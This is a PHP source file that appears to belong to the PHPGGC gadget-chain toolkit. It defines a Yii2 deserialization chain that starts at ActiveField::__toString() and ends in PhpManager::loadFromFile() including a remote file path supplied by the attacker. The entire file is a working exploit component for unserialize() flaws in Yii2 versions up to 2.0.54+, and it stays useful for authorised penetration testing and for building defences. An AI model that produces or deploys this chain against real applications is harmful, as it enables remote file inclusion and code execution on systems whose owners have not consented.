<?php

namespace GadgetChain\Yii2;

class FI1 extends \PHPGGC\GadgetChain\FileInclude
{
    public static $version = '2.0.0 <= 2.0.54+';
    public static $vector = '__toString';
    public static $author = 'Andrey Ryzhov (github.com/notdenied), Elizar Batin';
    public static $information = '
        Includes $remote_path through yii\rbac\PhpManager::loadFromFile().
        The chain starts in yii\widgets\ActiveField::__toString() and requires
        Yii.php to be loaded, which is normally true in Yii2 applications.
    ';

    public function generate(array $parameters)
    {
        return new \yii\widgets\ActiveField(
            new \yii\di\ServiceLocator($parameters['remote_path']),
            new \yii\base\DynamicModel()
        );
    }
}
